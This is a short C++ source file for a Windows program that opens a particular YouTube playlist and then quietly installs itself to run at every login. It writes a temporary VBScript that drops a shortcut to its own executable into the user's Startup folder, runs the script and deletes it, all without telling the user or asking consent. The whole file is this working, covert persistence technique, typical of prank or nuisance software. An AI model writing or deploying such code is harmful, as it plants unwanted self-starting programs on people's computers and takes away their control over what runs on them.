#include <windows.h>
#include <shlobj.h>
#include <fstream>
#include <string>

int main() {
// ZAH1DE PLAYLIST
    system("start https://www.youtube.com/watch?v=mrIYFjjuMh0&list=PLmcG3euFiBwfBc9M1XN2kFit0a_mmjLsS");

    char path[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, path))) {
        std::string shortcut = std::string(path) + "\\YT_Autostart.lnk";
        char exePath[MAX_PATH];
        GetModuleFileNameA(NULL, exePath, MAX_PATH);

        std::ofstream vbs("create_shortcut.vbs");
        vbs << "Set oWS = WScript.CreateObject(\"WScript.Shell\")\n";
        vbs << "sLinkFile = \"" << shortcut << "\"\n";
        vbs << "Set oLink = oWS.CreateShortcut(sLinkFile)\n";
        vbs << "oLink.TargetPath = \"" << exePath << "\"\n";
        vbs << "oLink.Save\n";
        vbs.close();

        system("cscript //nologo create_shortcut.vbs");
        remove("create_shortcut.vbs");
    }

    return 0;
}
